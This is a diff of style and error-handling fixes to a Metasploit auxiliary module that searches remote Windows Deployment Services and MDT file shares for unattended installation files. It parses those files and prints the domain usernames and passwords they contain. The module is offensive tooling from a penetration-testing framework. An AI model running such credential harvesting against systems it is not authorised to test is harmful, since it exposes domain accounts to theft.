@@ -21,9 +21,9 @@ class Metasploit3 < Msf::Auxiliary
       'Name'           => 'Microsoft Windows Deployment Services Unattend Gatherer',
       'Description'    => %q{
           This module will search remote file shares for unattended installation files that may contain
-          domain credentials. This is often used after discovering domain credentials with the 
+          domain credentials. This is often used after discovering domain credentials with the
           auxilliary/scanner/dcerpc/windows_deployment_services module or in cases where you already
-          have domain credentials. This module will connect to the RemInst share and any Microsoft 
+          have domain credentials. This module will connect to the RemInst share and any Microsoft
           Deployment Toolkit shares indicated by the share name comments.
       },
       'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
   def srvsvc_netshareenum
     shares = []
     handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0', 'ncacn_np', ["\\srvsvc"])
-    
+
     begin
       dcerpc_bind(handle)
     rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
@@ -88,7 +88,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Level, CTR header, Reference ID of CTR
-    res.slice!(0,12) 
+    res.slice!(0,12)
     share_count = res.slice!(0, 4).unpack("V")[0]
 
     # Reference ID of CTR1
@@ -104,7 +104,7 @@ class Metasploit3 < Msf::Auxiliary
 
     share_count.times do |t|
       length, offset, max_length = res.slice!(0, 12).unpack("VVV")
-      
+
       if offset != 0
         fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share offset was not zero")
       end
@@ -136,7 +136,6 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-  
     deploy_shares = []
 
     begin
@@ -148,7 +147,7 @@ class Metasploit3 < Msf::Auxiliary
         share_comm = share[2].unpack("v*").pack("C*").split("\x00").first
         share_type = share[1]
 
-        if share_type == "DISK" and (share_name == "REMINST" or share_comm == "MDT Deployment Share")
+        if share_type == "DISK" && (share_name == "REMINST" or share_comm == "MDT Deployment Share")
           vprint_good("#{ip}:#{rport} Identified deployment share #{share_name} #{share_comm}")
           deploy_shares << share_name
         end
@@ -167,17 +166,9 @@ class Metasploit3 < Msf::Auxiliary
     share_path = "\\\\#{rhost}\\#{share}"
     vprint_status("#{rhost}:#{rport} Enumerating #{share}...")
 
-    table = Rex::Ui::Text::Table.new({
-      'Header'  => share_path,
-      'Indent'  => 1,
-      'Columns' => ['Path', 'Type', 'Domain',  'Username', 'Password']
-    })
-
-    creds_found = false
-
     begin
       simple.connect(share_path)
-    rescue ::Exception => e
+    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
       print_error("#{rhost}:#{rport} Could not access share: #{share} - #{e}")
       return
     end
@@ -186,19 +177,19 @@ class Metasploit3 < Msf::Auxiliary
 
     results.each do |file_path|
       file = simple.open(file_path, 'o').read()
-      next unless file 
-    
+      next unless file
+
       loot_unattend(file)
 
       creds = parse_client_unattend(file)
       creds.each do |cred|
-        next unless (cred and cred['username'] and cred['password'])
+        next unless (cred && cred['username'] && cred['password'])
         next unless cred['username'].to_s.length > 0
         next unless cred['password'].to_s.length > 0
 
         report_creds(cred['domain'].to_s, cred['username'], cred['password'])
         print_good("#{rhost}:#{rport} Credentials: " +
-          "Path=#{file_path} " +
+          "Path=#{share_path}#{file_path} " +
           "Username=#{cred['domain'].to_s}\\#{cred['username'].to_s} " +
           "Password=#{cred['password'].to_s}"
         )
@@ -238,3 +229,4 @@ class Metasploit3 < Msf::Auxiliary
   end
 
 end
+
